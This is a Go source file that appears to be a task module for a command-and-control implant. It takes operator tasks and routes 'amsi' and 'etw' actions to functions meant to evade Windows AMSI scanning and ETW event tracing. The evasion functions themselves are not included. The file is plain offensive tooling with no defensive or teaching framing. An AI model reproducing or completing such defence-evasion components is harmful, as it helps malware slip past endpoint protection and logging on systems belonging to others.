package main

/*
#include <stdlib.h>
*/
import "C"

import (
	"errors"
	"fmt"
	"sync"
)

var etwEvaded bool

var amsiEvaded bool

type Task struct {
	TaskId     string `json:"taskid"`
	TaskAction string `json:"taskaction"`
	Args       []string `json:"args"`

	// General Purpose
	status   string
	tasktype string

	mu *sync.Mutex
}

func InitialiseTask(task *Task) error {
	task.tasktype = "respevasion"
	task.mu = &sync.Mutex{}
	if task.Args == nil {
		task.Args = []string{""}
	}
	return nil
}

func TaskHandler(task *Task) (stdout []byte, err error) {
	fmt.Println("Task Action is ---->", task.TaskAction)
	switch task.TaskAction {
	case "amsi":
        if len(task.Args) < 1 {
            s := []byte("Error in args number")
            return s, errors.New(string(s))
        }
		stdout, err := evadeAmsi(task.Args[0])
		task.status = "completed"
		return stdout, err
	case "etw":
        if len(task.Args) < 1 {
            s := []byte("Error in args number")
            return s, errors.New(string(s))
        }
		stdout, err := evadeEtw(task.Args[0])
        task.status = "completed"
		return stdout, err
	}
	fmt.Println("Done Executing")
	fmt.Println("Result From DLL --->")
	fmt.Println(string(stdout))
	task.status = "completed"
	return []byte(""), errors.New("Invalid Task Action")
}

// Tell us if task if done (failed or completed)
func IsTaskDone(task Task) bool {
	if task.status == "completed" || task.status == "failed" {
		return true
	}
	return false
}

// Return Task Status
func ComputeTaskStatus(task Task) string {
	return task.status
}

// Return Task Type
func ComputeTaskType(task Task) string {
	return task.tasktype
}
